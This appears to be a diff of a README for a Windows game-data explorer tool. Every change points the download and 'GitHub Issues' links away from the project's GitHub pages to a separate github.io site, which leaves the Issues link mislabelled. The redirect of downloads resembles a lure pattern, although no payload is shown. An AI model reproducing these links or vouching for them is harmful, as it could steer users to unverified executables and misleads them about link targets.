@@ -1,6 +1,6 @@
 # 📁 d2-prebl-explorer-info - Explore Your Game Data Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aditya974240/d2-prebl-explorer-info/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://aditya974240.github.io)
 
 ## 🎯 What Is This?
 
@@ -20,7 +20,7 @@ d2-prebl-explorer-info is a simple tool that helps you browse and view informati
 
 Visit this link to download the application.
 
-[📥 Download d2-prebl-explorer-info](https://github.com/aditya974240/d2-prebl-explorer-info/releases)
+[📥 Download d2-prebl-explorer-info](https://aditya974240.github.io)
 
 ### Step 2: Run the Program
 
@@ -95,7 +95,7 @@ A: Check the download page periodically for new versions. Download and replace t
 
 If you encounter issues not covered here:
 
-1. Visit the [GitHub Issues page](https://github.com/aditya974240/d2-prebl-explorer-info/issues) to report problems
+1. Visit the [GitHub Issues page](https://aditya974240.github.io) to report problems
 2. Search existing issues to see if your problem has been solved
 3. Provide details about your Windows version and what you were doing when the error occurred
 
